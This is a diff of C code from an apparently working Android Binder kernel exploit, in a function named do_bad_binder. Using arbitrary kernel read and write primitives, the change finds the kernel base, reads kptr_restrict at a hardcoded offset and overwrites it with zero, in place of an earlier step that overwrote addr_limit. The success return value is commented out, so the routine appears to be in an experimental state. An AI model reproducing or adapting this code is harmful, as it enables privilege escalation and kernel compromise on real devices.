@@ -551,28 +551,23 @@ int32_t do_bad_binder(uint64_t* ppTaskStruct, uint64_t* ppThreadInfo, uint64_t* 
 
     *ppKernelBase = *pFairSchedClass - 0xBD5638;
 
-    printf("[!] kernel base %lx\n", *ppKernelBase);
+    uint64_t pkptr_restrict = *ppKernelBase + 0x1955418;
 
-    printf("[!] attempting to overwrite addr_limit...\n");
+    leak_kernel_memory(iBinderFd, iEpFd, pDummyBuff, pkptr_restrict, 0x8, pTaskStructData, &pTaskStruct);
 
-    pAddrLimit = pThreadInfo + ADDR_LIMIT_THREAD_INFO_OFFSET;
+    uint64_t kptr_restrict = *(uint64_t*)pTaskStructData;
 
-    if(0 != write_kernel_memory(iBinderFd, iEpFd, pDummyBuff, pAddrLimit, sizeof(uint64_t), &ulNewAddrLimit))
-    {
-        printf("[-] failed to overwrite current thread's address limit!\n");
-        goto done;
-    }
+    printf("kptr_restrict %lx\n", kptr_restrict);
 
-    printf("testing kernel r/w\n");
+    kptr_restrict = 0x0;
 
-    uint64_t test = kernel_read_ulong(pAddrLimit);
+    write_kernel_memory(iBinderFd, iEpFd, pDummyBuff, pkptr_restrict, sizeof(uint64_t), &kptr_restrict);
 
-    printf("new addr limit %lx\n", test);
 
     *ppTaskStruct = pTaskStruct;
     *ppThreadInfo = pThreadInfo;
 
-    iRet = 0;
+    //iRet = 0;
 
 done:
 
